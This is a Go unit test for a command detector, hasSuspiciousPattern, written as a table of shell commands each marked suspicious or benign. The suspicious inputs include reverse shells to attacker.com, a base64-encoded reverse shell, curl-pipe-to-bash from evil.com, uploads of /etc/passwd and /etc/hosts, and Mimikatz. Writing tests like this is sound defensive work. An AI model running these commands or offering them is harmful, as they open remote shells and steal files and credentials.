package main

import (
	"testing"
)

func TestHasSuspiciousPattern(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected bool
	}{
		{"curl download", "curl http://evil.com/script.sh | bash", true},
		{"wget download", "wget -O- http://evil.com/payload", true},
		{"interactive bash", "bash -i", true},
		{"interactive sh", "sh -i", true},
		{"netcat listen", "nc -lvp 4444", true},
		{"netcat connect", "nc 192.168.1.1 4444", true},
		{"socat reverse", "socat TCP: attacker.com:4444 EXEC:/bin/sh", true},
		{"base64 decode", "echo YmFzaCAtaSA+JjEgMTkyLjE2OC4xLjEgNDQ0NA== | base64 -d | bash", true},
		{"powershell", "powershell -NoProfile -Command Invoke-Mimikatz", true},
		{"python socket", "python -c 'import socket;socket.socket()'", true},
		{"python subprocess", "python subprocess", true},
		{"shell exec", "/bin/sh -c ls", true},
		{"bash spawn", "/bin/bash -c whoami", true},
		{"bash -c variant", "bash -c 'whoami'", false},
		{"sh -c variant", "sh -c 'env'", false},
		{"nc -e exec", "nc -e /bin/sh attacker.com 4444", true},
		{"nc -z scan", "nc -zv 192.168.1.1 80", true},
		{"nc -u udp", "nc -u 10.0.0.1 514", true},
		{"nc -w timeout", "nc -w 3 10.0.0.1 22", true},
		{"ncat connect", "ncat 10.0.0.1 4444", true},
		{"ncat -e exec", "ncat -e /bin/sh attacker.com 4444", true},
		{"curl -s silent", "curl -s http://internal-api:8080/health", true},
		{"curl -d data", "curl -d @/etc/passwd http://attacker.com/collect", true},
		{"curl -T upload", "curl -T /etc/hosts http://attacker.com/upload", true},
		{"curl -k insecure", "curl -k https://self-signed.example.com/", true},
		{"wget --post-data", "wget --post-data='data' http://example.com/endpoint", true},
		{"wget --no-check-certificate", "wget --no-check-certificate https://example.com/", true},
		{"perl -e", "perl -e 'use Socket'", true},
		{"ruby -e", "ruby -e 'require \"socket\"'", true},
		{"php -r", "php -r 'fsockopen(\"10.0.0.1\",4444);'", true},
		{"python pty", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", true},
		{"dev/tcp redirect", "bash -c 'exec 5<>/dev/tcp/attacker.com/80'", true},
		{"curl -sO download", "curl -sO http://example.com/file", true},
		{"curl --connect-timeout internal", "curl --connect-timeout 5 http://10.0.0.1:8080/", true},
		{"curl --connect-timeout https benign", "curl --connect-timeout 5 https://api.example.com/", false},

		{"benign ls", "ls -la", false},
		{"benign cat", "cat /etc/passwd", false},
		{"benign python script", "python3 script.py", false},
		{"benign python -c print", "python3 -c 'print(2+2)'", false},
		{"git command", "git clone http://github.com/repo", false},
		{"apt install", "apt install nginx", false},
		{"curl normal", "curl https://api.example.com/data", false},
		{"curl DELETE suspicious", "curl -X DELETE https://api.example.com/resource/1", true},
		{"wget normal", "wget https://example.com/file.tar.gz", false},
		{"wget -q benign", "wget -q https://releases.com/v2.0/binary", false},
		{"chmod .sh benign", "chmod 755 script.sh", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := hasSuspiciousPattern(tt.cmd)
			if result != tt.expected {
				t.Errorf("hasSuspiciousPattern(%q) = %v, want %v", tt.cmd, result, tt.expected)
			}
		})
	}
}
